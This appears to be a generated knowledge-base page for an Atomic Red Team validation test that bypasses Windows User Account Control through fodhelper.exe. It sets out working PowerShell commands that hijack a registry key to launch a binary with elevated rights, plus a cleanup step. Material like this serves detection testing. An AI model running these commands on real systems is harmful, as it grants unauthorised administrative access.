---
atomic_guid: "3f627297-6c38-4e7d-a278-fc2563eaaeaa"
title: "Bypass UAC using Fodhelper - PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "3f627297-6c38-4e7d-a278-fc2563eaaeaa"
  - "Bypass UAC using Fodhelper - PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bypass UAC using Fodhelper - PowerShell

PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.

## Metadata

- Atomic GUID: 3f627297-6c38-4e7d-a278-fc2563eaaeaa
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: powershell

### Command

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### Cleanup

```powershell
Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
